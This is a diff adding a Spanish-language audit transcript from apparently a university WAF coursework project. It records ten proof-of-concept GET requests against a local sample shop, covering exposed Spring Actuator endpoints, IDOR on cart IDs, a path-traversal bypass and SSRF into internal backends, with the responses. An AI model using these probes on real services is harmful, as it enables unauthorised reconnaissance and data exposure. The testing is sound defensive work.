@@ -1,0 +1,211 @@
+╔══════════════════════════════════════════════════════════════════╗
+║  WAF PRE-DEPLOYMENT AUDIT · TRANSCRIPT COMPLETO DE EVIDENCIA      ║
+║  TPE Protección de Servicios con WAF · ITBA · 1C 2026             ║
+║  Capturado: 2026-04-16T21:49:01Z                                  ║
+║  Target:    http://localhost                                      ║
+║  Método:    JavaScript fetch desde DevTools de Chrome             ║
+║  Total PoCs documentados: 10                                      ║
+╚══════════════════════════════════════════════════════════════════╝
+
+════════════════════════════════════════════════════════════════════════
+PoC1 · Prometheus dump directo (CRÍTICO — exfiltración de infraestructura)
+════════════════════════════════════════════════════════════════════════
+
+--- REQUEST ---
+GET /actuator/prometheus HTTP/1.1
+Host: localhost
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+content-type: text/plain;version=0.0.4;charset=utf-8
+content-encoding: gzip
+content-length: 3932 (descomprimido: 26.778 bytes)
+connection: keep-alive
+
+# HELP application_ready_time_seconds Time taken for the application to be ready to service requests
+# TYPE application_ready_time_seconds gauge
+application_ready_time_seconds{main_application_class="com.amazon.sample.ui.UiApplication"} 9.782
+# HELP application_started_time_seconds Time taken to start the application
+# TYPE application_started_time_seconds gauge
+application_started_time_seconds{main_application_class="com.amazon.sample.ui.UiApplication"} 9.78
+# HELP disk_free_bytes Usable space for path
+# TYPE disk_free_bytes gauge
+disk_free_bytes{path="/app/."} 1.00217010176E12
+# HELP disk_total_bytes Total space for path
+# TYPE disk_total_bytes gauge
+disk_total_bytes{path="/app/."} 1.081100128256E12
+# HELP executor_active_threads The approximate number of threads...
+... [26.778 bytes totales — 175 series Prometheus que incluyen
+     nombres de los 4 microservicios, JVM info, paths llamados,
+     excepciones internas, threads pool, etc.]
+
+VEREDICTO: 🔴 VULNERABLE — sin auth, sin filtros, 26 KB de info por hit.
+
+════════════════════════════════════════════════════════════════════════
+PoC2 · Spring Actuator /health expuesto
+════════════════════════════════════════════════════════════════════════
+
+--- REQUEST ---
+GET /actuator/health HTTP/1.1
+Host: localhost
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+content-type: application/vnd.spring-boot.actuator.v3+json
+content-length: 49
+
+{"status":"UP","groups":["liveness","readiness"]}
+
+VEREDICTO: 🔴 VULNERABLE — confirma stack Spring Boot, atacante itera más.
+
+════════════════════════════════════════════════════════════════════════
+PoC3 · /actuator/info abierto (puerta de enumeración)
+════════════════════════════════════════════════════════════════════════
+
+--- REQUEST ---
+GET /actuator/info HTTP/1.1
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+content-type: application/vnd.spring-boot.actuator.v3+json
+{}
+
+VEREDICTO: 🔴 VULNERABLE — el 200 OK confirma Actuator, primer paso del ataque.
+
+════════════════════════════════════════════════════════════════════════
+PoC4 · /actuator/metrics — índice de TODAS las métricas instrumentadas
+════════════════════════════════════════════════════════════════════════
+
+--- REQUEST ---
+GET /actuator/metrics HTTP/1.1
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+content-length: 1.006 bytes
+
+{"names":["application.ready.time","application.started.time","disk.free",
+"disk.total","executor.active","executor.completed","executor.pool.core",
+"executor.pool.max","executor.pool.size","executor.queue.remaining",
+"executor.queued","http.client.requests","http.client.requests.active",
+"http.server.requests","http.server.requests.active","jvm.buffer.count",
+"jvm.buffer.memory.used","jvm.buffer.total.capacity","jvm.classes.loaded",
+"jvm.classes.unloaded","jvm.compilation.time","jvm.gc.live.data.size",
+"jvm.gc.max.data.size","jvm.gc.memory.allocated","jvm.gc.memory.promoted",
+"jvm.gc.overhead","jvm.gc.pause","jvm.info","jvm.memory.committed",
+"jvm.memory.max","jvm.memory.usage.after.gc","jvm.memory.used",
+"jvm.threads.daemon","jvm.threads.live","jvm.threads.peak","jvm.threads.started",
+"jvm.threads.states","log4j2.events","process.cpu.time","process.cpu.usage",
+"process.files.max","process.files.open","process.start.time","process.uptime",
+"system.cpu.count","system.cpu.usage","system.load.average...
+
+VEREDICTO: 🔴 VULNERABLE — 44 métricas instrumentadas, cada una consultable individualmente con /actuator/metrics/{name}.
+
+════════════════════════════════════════════════════════════════════════
+PoC5 · IDOR confirmado · /proxy/carts/admin
+════════════════════════════════════════════════════════════════════════
+
+--- REQUEST ---
+GET /proxy/carts/admin HTTP/1.1
+Host: localhost
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+content-type: application/json
+content-length: 33
+
+{"customerId":"admin","items":[]}
+
+VEREDICTO: 🔴 VULNERABLE — Backend ClusterIP `carts` accesible desde Internet
+          + lectura de carrito de cualquier customerId sin autenticación.
+
+════════════════════════════════════════════════════════════════════════
+PoC6 · IDOR · /proxy/carts/test (mismo patrón, otro ID)
+════════════════════════════════════════════════════════════════════════
+
+--- REQUEST ---
+GET /proxy/carts/test HTTP/1.1
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+{"customerId":"test","items":[]}
+
+VEREDICTO: 🔴 VULNERABLE — confirma que el endpoint acepta CUALQUIER ID.
+
+════════════════════════════════════════════════════════════════════════
+PoC7 · Path Traversal · /proxy/catalog/../../actuator/info
+════════════════════════════════════════════════════════════════════════
+
+--- REQUEST ---
+GET /proxy/catalog/../../actuator/info HTTP/1.1
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+content-type: application/vnd.spring-boot.actuator.v3+json
+{}
+
+VEREDICTO: 🔴 VULNERABLE — el `..` escapa el host del backend `catalog` y termina
+          hitteando el actuator del propio UI. Bypass total de cualquier filtro
+          que mire solo el path post-routing.
+
+════════════════════════════════════════════════════════════════════════
+PoC8 · Path Traversal CRÍTICO · /proxy/catalog/../../actuator/prometheus
+════════════════════════════════════════════════════════════════════════
+
+--- REQUEST ---
+GET /proxy/catalog/../../actuator/prometheus HTTP/1.1
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+content-encoding: gzip
+content-length: 3.946 bytes (descomprimido: 26.785 bytes)
+
+[mismo dump de Prometheus que PoC1, ahora vía traversal]
+
+VEREDICTO: 🔴 VULNERABLE — exfiltración masiva via SSRF+traversal. Si /actuator
+          se bloqueara directamente, ESTE vector sigue funcionando.
+
+════════════════════════════════════════════════════════════════════════
+PoC9 · SSRF · backend `orders` alcanzado vía proxy
+════════════════════════════════════════════════════════════════════════
+
+--- REQUEST ---
+GET /proxy/orders/anything HTTP/1.1
+
+--- RESPONSE ---
+HTTP/1.1 404 Not Found
+content-type: application/json
+
+{"timestamp":"2026-04-16T21:49:01.380+00:00","status":404,"error":"Not Found","path":"/orders/anything"}
+
+VEREDICTO: 🔴 VULNERABLE — el formato del error JSON (con `timestamp`, `requestId`)
+          confirma que el backend `orders` (Spring Boot, ClusterIP) respondió
+          DIRECTAMENTE desde el cluster. NO debería ser alcanzable desde fuera.
+
+════════════════════════════════════════════════════════════════════════
+PoC10 · SSRF · backend `checkout` (NestJS) alcanzado · ¡con disclosure!
+════════════════════════════════════════════════════════════════════════
+
+--- REQUEST ---
+GET /proxy/checkout/anything HTTP/1.1
+
+--- RESPONSE ---
+HTTP/1.1 404 Not Found
+content-type: application/json
+x-powered-by: Express                ← ⚠️ STACK DISCLOSURE
+etag: W/"45-Bu16IjxE7G87GVm1Ni6Q1CVLuiU"
+
+{"message":"Checkout not found","error":"Not Found","statusCode":404}
+
+VEREDICTO: 🔴 VULNERABLE — además de SSRF, el header `x-powered-by: Express`
+          confirma que el backend está hecho con NestJS (sobre Express).
+          Eso da al atacante CVEs específicos para buscar.
+
+════════════════════════════════════════════════════════════════════════
+RESUMEN
+════════════════════════════════════════════════════════════════════════
+
+Total PoCs ejecutados: 10
+Vulnerables (status 2xx donde debería ser 4xx, o backend interno respondió): 10/10
+Bytes leakeados acumulados: 53.561 bytes
+Tiempo total de la auditoría: ~1 segundo
+Stacks confirmados: Spring Boot 3 (UI, carts, orders) + NestJS/Express (checkout) + Go/Gin (catalog, inferido)
